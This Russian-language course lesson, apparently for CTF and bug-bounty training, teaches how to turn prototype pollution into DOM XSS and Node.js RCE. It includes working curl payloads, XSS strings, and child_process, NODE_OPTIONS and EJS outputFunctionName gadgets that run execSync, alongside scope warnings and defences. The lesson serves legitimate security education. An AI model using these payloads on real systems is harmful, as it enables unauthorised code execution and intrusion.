---
id: web-prototype-pollution-rce
title: "Prototype pollution → DOM XSS и server-side RCE"
category: web
parent: web-prototype-pollution
difficulty: hard
order: 1
tags: [prototype-pollution, xss, rce, gadget, nodejs, client-side]
prerequisites: [web-prototype-pollution, web-xss, web-command-injection]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "Как из «просто отравленного» Object.prototype собрать цепочку до DOM XSS в браузере или RCE на Node.js."
---

Прототипное загрязнение (`web-prototype-pollution`) само по себе — лишь примитив: вы добавляете свойство в `Object.prototype`. Ценность появляется, когда это свойство попадает в **sink** — в браузере это DOM XSS, на сервере (Node.js) это RCE через `child_process`. Этот урок — про **цепочки** (gadgets): где искать sink, как соединить отравленный прототип с исполнением и как доказать impact.

## Теория: примитив загрязнения

Пользовательский ввод, который рекурсивно мёржится в объект, загрязняет прототип:

```js
// уязвимый merge
function merge(target, src) {
  for (const k in src) {
    if (typeof src[k] === 'object') merge(target[k] || (target[k] = {}), src[k]);
    else target[k] = src[k];
  }
}
merge({}, JSON.parse('{"__proto__":{"polluted":"yes"}}'));
console.log({}.polluted); // "yes"
```

Ключи-векторы: `__proto__`, `constructor.prototype`. Источники: JSON-тела, query-параметры (`?__proto__[x]=y`), form-data, `Object.assign`, `lodash.merge` (старые версии), `jQuery.extend` (старые).

## Теория: client-side gadgets → DOM XSS

После загрязнения нужно, чтобы существующий код читал свойство из прототипа и передавал его в опасный sink. Классические gadget-паттерны:

1. **`innerHTML` из опций.** Библиотека читает `opts.html` (или `defaults.html`), а он теперь из прототипа:
   ```js
   // где-то в библиотеке
   el.innerHTML = options.html || '';
   ```
   Отравляем `Object.prototype.html = '<img src=x onerror=alert(1)>'`.

2. **`src`/`href`/`data`.** `script.src = config.src`; `a.href = opts.url`.

3. **`setTimeout`/`Function`.** Меньше распространено, но встречается.

Инструмент для поиска: **DOM Invader** (Burp) умеет искать prototype-pollution gadgets автоматически. Вручную — ищем в JS бандлах паттерны `\w+\.\w+\s*\)` рядом с `innerHTML`, `src=`, `href=`.

## Теория: server-side gadgets → RCE (Node.js)

На сервере отравленный прототип ломает логику и может привести к RCE. Известные цепочки:

- **`child_process.execSync`/`spawn` с опциями из прототипа.** Например, библиотека вызывает `child_process.execFile('ls', {shell: opts.shell})`; отравляем `Object.prototype.shell = 'bash'` и `Object.prototype.env`/`argv0`, чтобы исполнить команду.
- **`NODE_OPTIONS`.** Если загрязнение доходит до `env` при `fork`/`spawn`, можно подсунуть `--require /proc/self/environ`.
- **`require`-based gadgets** в популярных пакетах (`lodash`, `express`, `pug`, `handlebars`).

Классические примеры: CVE-2019-10744 (lodash), CVE-2021-23337 (lodash template), CVE-2019-7609 (Kibana), CVE-2022-... (различные Node-фреймворки).

## Инструменты и команды

Проверить клиентское загрязнение в консоли:

```js
// после отправки ?__proto__[polluted]=yes
console.log({}.polluted);            // "yes" => загрязнено
```

Серверное (Node) — через запрос, затем наблюдать эффект:

```bash
# кандидат-параметр, который рекурсивно мёржится
curl -s 'https://target.local/api/settings' \
  -H 'Content-Type: application/json' \
  --data '{"__proto__":{"json spaces":10}}'
```

Если сервер отдаёт JSON с изменённым форматированием (`json spaces` — известный Express-gadget) — загрязнение есть, ищем RCE-gadget.

Поиск gadgets в бандлах:

```bash
curl -s https://target.local/main.js -o main.js
grep -nE 'innerHTML|\.src *=|\.href *=|child_process|execSync|spawn' main.js | head
```

## Разобранный пример: client-side PP → DOM XSS

Шаг 1. Находим эндпоинт, рекурсивно мёржущий JSON. Проверяем:

```bash
curl -s 'https://target.local/api/prefs' -H 'Content-Type: application/json' \
  --data '{"__proto__":{"polluted":"1"}}'
```

Шаг 2. В браузере (DevTools) подтверждаем `({}).polluted === "1"` после вызова функции — загрязнение работает.

Шаг 3. Подбираем gadget: находим в JS место, читающее из опций `html`/`url`. Отравляем нужное свойство:

```json
{"__proto__":{"html":"<img src=x onerror=alert(document.domain)>"}}
```

Шаг 4. Триггерим компонент, который рендерит `options.html` → срабатывает XSS. В отчёте: запрос загрязнения + компонент-триггер.

## Разобранный пример: server-side PP → RCE

Допустим, приложение использует уязвимую версию библиотеки, которая при импорте вызывает `child_process.execFile(..., {shell: ...})`. Загрязняем:

```bash
curl -s 'https://target.local/api/x' -H 'Content-Type: application/json' \
  --data '{"__proto__":{"shell":"node","argv0":"console.log(require(\"child_process\").execSync(\"id\").toString())//"}}'
```

Затем триггерим операцию, вызывающую `execFile`. Если вывод `id` вернулся в ответе — RCE. **Внимание:** это эксплуатация, выполняйте только в рамках scope и с разрешения; проверяйте безопасность команды (никаких разрушительных действий).

## Частые ошибки

- **Останавливаться на «загрязнено».** Примитив без sink — не impact. Нужна цепочка.
- **Путать `__proto__` и `constructor.prototype`.** Оба вектора надо пробовать; некоторые санитайзеры режут только один.
- **Искать sink только в своём коде.** Gadget обычно в библиотеке (lodash, jQuery, шаблонизатор).
- **Забывать про версии.** `lodash.merge` < 4.17.12 и т.п. — проверяйте версию.
- **Небезопасные RCE-команды.** На сервере `id`/`whoami` достаточно для доказательства; не выполняйте разрушительное.

## Server-side PP → RCE: полные гаджет-цепочки

На Node.js загрязнение `Object.prototype` даёт RCE через библиотеки, читающие опции из прототипа. Ниже — известные цепочки.

```javascript
// 1) child_process: загрязняем shell/env
Object.prototype.shell = 'node';
Object.prototype.argv0 = 'node';
Object.prototype.NODE_OPTIONS = '--require /proc/self/environ';
Object.prototype.env = { EVIL: 'console.log(require("child_process").execSync("id").toString())//' };
// при вызове child_process.spawn/fork с унаследованными опциями -> RCE
```

```javascript
// 2) EJS: загрязняем outputFunctionName
Object.prototype.outputFunctionName = 'x;process.mainModule.require("child_process").execSync("id");s';
// при ejs.render(template, data) -> инъекция в сгенерированный код
```

```javascript
// 3) Pug: загрязняем compileDebug/self
Object.prototype.compileDebug = true;
Object.prototype.self = true;
// некоторые версии позволяют внедрить код через опции компиляции
```

```bash
# проверка, что PP дошёл до сервера (без RCE)
curl -s -X POST https://api.example/merge \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"polluted":"yes"}}'
curl -s https://api.example/status | grep polluted   # если видно -> PP подтверждён
```

## Как искать серверные гаджеты

```bash
# 1) находим зависимости
curl -s https://app.example/package.json   # или из репозитория
# 2) ищем опасные вызовы в node_modules
grep -rEn 'child_process|exec\(|spawn\(|fork\(' node_modules/ejs node_modules/pug | head
# 3) ppmap — автоматический поиск гаджетов
npx ppmap
# 4) проверяем версии известных уязвимых библиотек
npm ls ejs pug handlebars lodash
```

Ключ: гаджет существует, если библиотека (а) читает свойство из прототипа и (б) использует его в исполняемом контексте (команда, `eval`, шаблон).

## Client-side гаджеты → DOM XSS

На клиенте цепочка короче: свойство из прототипа попадает в sink.

| Гаджет-свойство | Sink | Эффект |
|-----------------|------|--------|
| `src` / `href` | `<script src>` / `<a href>` | загрузка/переход |
| `innerHTML` | `element.innerHTML` | XSS |
| `srcdoc` | iframe | XSS |
| `template` | шаблонизатор | SSTI/XSS |
| `onload`/`onerror` | атрибут | XSS |
| `data` | jQuery `.data()` | подмена |

```text
# URL-загрязнение, ведущее к DOM-XSS через jQuery-гаджет
https://app.example/#__proto__[src]=data:,alert(1)
```

## Разобранный пример: серверный PP → RCE (Node)

```text
1) приложение использует lodash.merge с телом JSON
2) отправляем: {"__proto__":{"outputFunctionName":"x;require('child_process').execSync('id');s"}}
3) приложение вызывает ejs.render(template, data)
4) EJS строит функцию с нашим outputFunctionName -> выполняется 'id'
5) ответ/логи содержат вывод команды
```

```bash
curl -s -X POST https://app.example/render \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"outputFunctionName":"x;process.mainModule.require(\"child_process\").execSync(\"id\").toString();s"}}'
```

Доказательство: вывод `id` (или reverse shell). Зафиксируйте версии библиотек — они объясняют цепочку.

## Инструменты

```bash
# ppmap — поиск клиентских/серверных гаджетов
npx ppmap
# DOM Invader (Burp) — клиентский PP
# nuclei — шаблоны PP
nuclei -u https://app.example -tags prototype-pollution -j
# Burp + JSON-тело с __proto__ вручную
```

## Что делать дальше / решение

1. **Найдите merge-точку.** JSON/query, рекурсивно вливающиеся в объект.
2. **Подтвердите PP.** `{"__proto__":{"x":"y"}}` + чтение `x`.
3. **Проверьте обход.** `constructor.prototype`, вложенность.
4. **Найдите гаджет.** child_process/EJS/Pug на сервере, DOM-sinks на клиенте.
5. **Постройте RCE/XSS.** Выполните `id` или `alert`.
6. **Зафиксируйте PoC.** Запрос + вывод команды/alert.

## Практика и справочники

- **PortSwigger Academy** — «Prototype pollution» (client + server).
- **HackTricks** — «Prototype Pollution to RCE».
- **PayloadsAllTheThings** — Prototype Pollution.
- **ppmap** — поиск гаджетов.

## Практические приоритеты в PP → RCE

Сначала подтвердите сам примитив загрязнения — без этого искать гаджеты бессмысленно. Отправьте `{"__proto__":{"x":"y"}}` в каждое место, где JSON/query рекурсивно вливается в объект, и проверьте, «увидело» ли приложение `x`. Затем соберите список зависимостей (`package.json`, бандл) и сопоставьте с известными гаджетами: EJS (`outputFunctionName`), Pug (`compileDebug`/`self`), child_process (`shell`/`NODE_OPTIONS`/`env`). На клиенте ищите sinks (`innerHTML`, `srcdoc`, `src`) и проверяйте, читается ли управляющее свойство из прототипа.

## Итог

Prototype pollution — это примитив, который сам по себе почти безвреден, но в связке с гаджетом даёт DOM-XSS или серверный RCE. Проверяйте оба контекста (клиент и Node.js), помните про обход `constructor.prototype` и рекурсивную вложенность, и обязательно фиксируйте PoC выводом команды (`id`) или сработавшим `alert`. Версии библиотек — ключ к пониманию, какая именно цепочка сработала.

## Частые ошибки при поиске PP → RCE

- Искать гаджеты, не подтвердив сам примитив загрязнения.
- Проверять только `__proto__` и забывать `constructor.prototype`.
- Смотреть только верхний уровень вложенности, пропуская рекурсивные merge.
- Не сопоставлять версии библиотек с известными гаджетами.
- Забывать про клиентскую сторону, где цепочка короче и часто даёт DOM-XSS.

## Дополнительно: как ускорить поиск

Соберите список зависимостей и сразу проверьте самые «гаджетоносные»: `lodash`, `ejs`, `pug`, `handlebars`, `merge`, `deepmerge`, `hoek`. Для каждой найдите вызовы, читающие опции из объекта, который мог быть загрязнён. На клиенте используйте DOM Invader: он сам подставляет `__proto__` в источники и показывает, дошло ли значение до sink. Это экономит часы ручного анализа бандла.

## Кратко

Prototype pollution — примитив, который сам по себе почти безвреден, но в связке с гаджетом даёт DOM-XSS или серверный RCE. Сначала подтвердите загрязнение, затем найдите библиотеку-гаджет (EJS, Pug, child_process) или клиентский sink. Помните про `constructor.prototype` и рекурсивную вложенность, и фиксируйте PoC выводом команды.

## Ещё деталь

Проверяйте не только прямое загрязнение, но и цепочки: сначала PP в `Object.prototype`, затем — загрязнение `Array.prototype` и `Function.prototype`, которые тоже читаются библиотеками при построении опций. Иногда гаджет срабатывает только при определённой комбинации свойств, поэтому перебирайте их группами.

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Чем prototype pollution становится опасным?"
  options:
    - "Само по себе оно критично"
    - "Когда отравленное свойство достигает sink (innerHTML/child_process)"
    - "Когда оно ускоряет сайт"
    - "Когда оно меняет DNS"
  answer: 1
  explanation: "Примитив + gadget = XSS/RCE."
- question: "Какой ключ загрязняет прототип при рекурсивном merge?"
  options:
    - "`__proto__`"
    - "`content-length`"
    - "`accept`"
    - "`host`"
  answer: 0
  explanation: "`__proto__` (и `constructor.prototype`) указывают на прототип объекта."
- question: "Где на клиенте искать gadget для PP→XSS?"
  options:
    - "В местах, где из опций берётся `innerHTML`/`src`/`href`"
    - "В CSS"
    - "В DNS"
    - "В cookie"
  answer: 0
  explanation: "Sink'и, читающие значения из прототипа, — цель для загрязнения."
- question: "Что из перечисленного — server-side gadget?"
  options:
    - "`child_process.execFile` с опциями из прототипа"
    - "`innerHTML`"
    - "`document.cookie`"
    - "`localStorage`"
  answer: 0
  explanation: "Node.js-цепочки идут через `child_process`/`env`/`NODE_OPTIONS`."
- question: "Достаточно ли доказательства `({}).polluted == '1'` для отчёта?"
  options:
    - "Да, это RCE"
    - "Нет, это только примитив — нужен sink и impact"
    - "Да, это XSS"
    - "Да, это SSRF"
  answer: 1
  explanation: "Загрязнение без sink не даёт утечки/исполнения."
```

## Где пригодится

- **CTF (Web):** задачи с JSON-merge и последующим XSS/RCE — классика.
- **Bug bounty:** PP→XSS в SPA и PP→RCE в Node-бэкендах — высокие выплаты.
- **Пентест:** анализ клиентских библиотек и Node-сервисов на gadgets.
- **Работа (AppSec/Dev):** защита — `Object.create(null)`, `Object.freeze(Object.prototype)`, обновление lodash.
